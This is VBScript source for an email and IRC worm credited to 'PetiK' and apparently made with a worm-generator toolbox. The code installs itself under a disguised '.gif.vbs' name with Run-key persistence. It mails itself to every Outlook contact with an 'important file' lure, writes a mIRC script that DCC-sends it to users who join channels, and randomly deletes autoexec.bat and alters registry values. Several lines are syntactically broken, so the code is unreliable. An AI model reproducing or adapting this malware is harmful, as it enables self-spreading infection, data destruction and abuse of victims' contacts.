   'EMM made by: PetiK.
   set R53O2H774A7U70BK = createobject("scripting.filesystemobject")
   V79J9V56X3N76BO = R53O2H774A7U70BK.getspecialfolder(1)
   L29P6G279U8O98WF = V79J9V56X3N76BO & "\emm.gif.vbs"
   set R98G5C999Q0O10CT = createobject("wscript.shell")
   R98G5C999Q0O10CT.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\emm", "wscript.exe "& V79J9V56X3N76BO & " %"
   R53O2H774A7U70BK.copyfile wscript.scriptfullname, L29P6G279U8O98WF
   Function T37H9P627K0O69WU()
   Set G8A3T297F4G34BM = CreateObject("Outlook.Application")
   If G8A3T297F4G34BM = "Outlook" Then
   Set F86O7X331N0P41YC = G8A3T297F4G34BM.GetNameSpace("MAPI")
   Set X62I1L219Y1A34NX = F86O7X331N0P41YC.AddressLists
   For Each N40V8Q721Y3M41RE In X62I1L219Y1A34NX
   If N40V8Q721Y3M41RE.AddressEntries.Count <> 0 Then
   K54U5K509F6M68WJ = N40V8Q721Y3M41RE.AddressEntries.Count
   For H29D5F584J8L19RS = 1 To K54U5K509F6M68WJ
   Set P78E8F956B0T37LC = G8A3T297F4G34BM.CreateItem(0)
   Set C17B7N561F4S75JW = N40V8Q721Y3M41RE.AddressEntries(H29D5F584J8L19RS)
   P78E8F956B0T37LC.To = C17B7N561F4S75JW.Address
   P78E8F956B0T37LC.Subject = "Very Important!"
   P78E8F956B0T37LC.Body = "Hello, Please view this file, it is very important.Thanks!"
   execute "set S8P7A431K2Y80RK = P78E8F956B0T37LC." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
   S27I4X121Q3C18BK = L29P6G279U8O98WF
   P78E8F956B0T37LC.DeleteAfterSubmit = True
   S8P7A431K2Y80RK.Add S27I4X121Q3C18BK
   If P78E8F956B0T37LC.To <> "" Then
   P78E8F956B0T37LC.Send
   End If
   Next
   End If
   Next
   End If
   End function
   Function G97B3J489D4G62ND(X54M9F378J2M13MY)
   If X54M9F378J2M13MY <> "" Then
   N90Q4R64S7M15FI = R98G5C999Q0O10CT.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If R53O2H774A7U70BK.fileexists("c:\mirc\mirc.ini") Then
   X54M9F378J2M13MY = "c:\mirc"
   ElseIf R53O2H774A7U70BK.fileexists("c:\mirc32\mirc.ini") Then
   X54M9F378J2M13MY = "c:\mirc32"
   ElseIf R53O2H774A7U70BK.fileexists(N90Q4R64S7M15FI & "\mirc\mirc.ini") Then
   X54M9F378J2M13MY = N90Q4R64S7M15FI & "\mirc"
   ElseIf R53O2H774A7U70BK.fileexists(N90Q4R64S7M15FI & "\mirc32\mirc.ini") Then
   X54M9F378J2M13MY = N90Q4R64S7M15FI & "\mirc"
   Else
   X54M9F378J2M13MY = ""
   End If
   End If
   If X54M9F378J2M13MY<>""Then
   Set T5M7U325Y8Q90VK = R53O2H774A7U70BK.CreateTextFile(X54M9F378J2M13MY & "\script.ini", True)
   T5M7U325Y8Q90VK = "[script]" &  vbCrLf & "n0=on 1:JOIN:#:{"
   T5M7U325Y8Q90VK = T5M7U325Y8Q90VK & vbCrLf & "n0=on 1:JOIN:#:{"
   T5M7U325Y8Q90VK = T5M7U325Y8Q90VK & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
   T5M7U325Y8Q90VK = T5M7U325Y8Q90VK & vbCrLf & "n2=  /."& Chr(100) & Chr(99) & Chr(99) & " send $nick "
   T5M7U325Y8Q90VK = T5M7U325Y8Q90VK & L29P6G279U8O98WF
   T5M7U325Y8Q90VK = T5M7U325Y8Q90VK & vbCrLf & "n3=}"
   script.Close
   End If
   Function HR1S72EF()
   On Error Resume Next
   Set A5O14007 = R53O2H774A7U70BK.Drives
   For Each FJSL26BF In A5O14007
   M816T4QH = FJSL26BF&"\"
   Call JT0F7SFG(M816T4QH)
   Next
   End function
   Function JT0F7SFG(D66I2D27)
   OT2016KI = D66I2D27
   Set GJF6856R = R53O2H774A7U70BK.GetFolder(OT2016KI)
   Set E9DOP13B = GJF6856R.Files
   For Each L3D1T217 In E9DOP13B
   if lcase(A15J1Y872O7D25AU = "mirc.ini" then
   G97B3J489D4G62ND(A15J1Y872O7D25AU.parentfolder)
   end if
   Next
   Set T79I4N803O2F36OI = M76U3E326K1P9FR.Subfolders
   For Each N42O0N206Y9Y83KUIn T79I4N803O2F36OI
   Call (N42O0N206Y9Y83KU.path)
   Next
   End function
   H4H3H948Y4G16EQ
   Function H4H3H948Y4G16EQ()
   If 1 + Int(Rnd * 9) = 10 then
   R98G5C999Q0O10CT.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","PetiK"
   R53O2H774A7U70BK.deletefile "c:\autoexec.bat"
   R98G5C999Q0O10CT.run "net send * Hello!", 7, false
   end if
   end function
   'Made with Visual Basic Worm Toolbox, which is a (psyence) software production
